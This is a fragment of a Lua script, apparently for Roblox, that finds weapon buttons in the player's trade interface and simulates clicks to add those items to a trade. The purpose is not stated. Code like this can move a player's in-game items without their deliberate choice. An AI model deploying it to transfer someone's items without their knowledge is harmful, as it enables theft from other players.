        end
    end
    return false
end

-- ============================================
-- ADD WEAPONS TO TRADE
-- ============================================

local function addWeaponsToTrade(weapons)
    local added = 0
    
    for _, weapon in pairs(weapons) do
        -- Try to find the weapon button in trade GUI
        for _, btn in pairs(player.PlayerGui:GetDescendants()) do
            if (btn:IsA("ImageButton") or btn:IsA("TextButton")) and btn.Visible then
                local btnName = btn.Name
                if btnName == weapon.name or (btn:FindFirstChild("ItemName") and btn.ItemName.Text == weapon.name) then
                    simulateClick(btn)
                    added = added + 1
                    break
                end
            end
        end
        wait(0.3)
    end
    
    return added
end

